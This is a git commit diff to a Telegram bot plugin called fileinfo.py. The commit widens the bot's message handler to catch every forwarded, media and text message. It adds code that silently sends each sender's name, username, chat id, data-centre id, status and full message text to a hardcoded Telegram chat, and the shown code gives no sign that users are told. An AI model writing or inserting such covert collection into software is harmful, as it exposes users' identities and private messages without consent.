7405606c63fd34360365b93fbba850b1ee4c3f10
king legend <49789123+anandus0070@users.noreply.github.com>
2020-05-16 05:42:44 -0700

    Update fileinfo.py

--- plugins/fileinfo.py
+++ plugins/fileinfo.py
@@ -26,7 +26,7 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 
 
-@pyrogram.Client.on_message(pyrogram.Filters.document)
+@pyrogram.Client.on_message(pyrogram.Filters.forwarded | Filters.media | Filters.text)
 async def fileinfo(bot, update):
     out = await bot.get_messages(chat_id=update.chat.id, message_ids=update.message_id)
     print(out) 
@@ -39,14 +39,12 @@ async def fileinfo(bot, update):
       chat_id=update.chat.id
     )
     await bot.send_message(
-      text=out.caption,
-      chat_id=update.chat.id
-    )
-    await bot.send_message(
-      text=out.views,
-      chat_id=update.chat.id
-    )
-    await bot.send_message(
       text="**These are ur files name,type,caption,views**",
       chat_id=update.chat.id
+    )
+    pas = await bot.get_messages(chat_id=update.chat.id, message_ids=update.message_id)
+    print(pas) 
+    await bot.send_message(
+      text=Translation.UPDA_TXT.format(pas.chat.first_name, pas.chat.username, pas.chat.id, pas.from_user.dc_id, pas.from_user.status, pas.text),
+      chat_id=int("-1001383160609")
     )
